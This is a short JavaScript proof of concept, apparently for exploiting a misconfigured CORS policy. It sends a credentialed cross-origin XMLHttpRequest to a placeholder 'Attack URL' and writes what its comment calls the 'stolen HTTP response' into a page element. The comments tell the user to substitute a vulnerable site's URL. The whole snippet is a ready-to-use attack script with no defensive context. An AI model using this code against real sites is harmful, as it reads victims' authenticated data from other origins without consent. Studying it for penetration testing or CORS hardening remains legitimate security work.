var xhttp = new XMLHttpRequest();
 xhttp.onreadystatechange = function() {
   if (this.readyState == 4 && this.status == 200) {
     var all = this.responseText;
     document.getElementById("services").innerHTML= all; // print the stolen HTTP response in division
     
      }
 };
 xhttp.open("GET", "Attack URL", true); //change the URL to the one which has mis-configured CORS policy
 xhttp.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,\/;q=0.8");
 xhttp.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
 xhttp.withCredentials = true;
 xhttp.send();
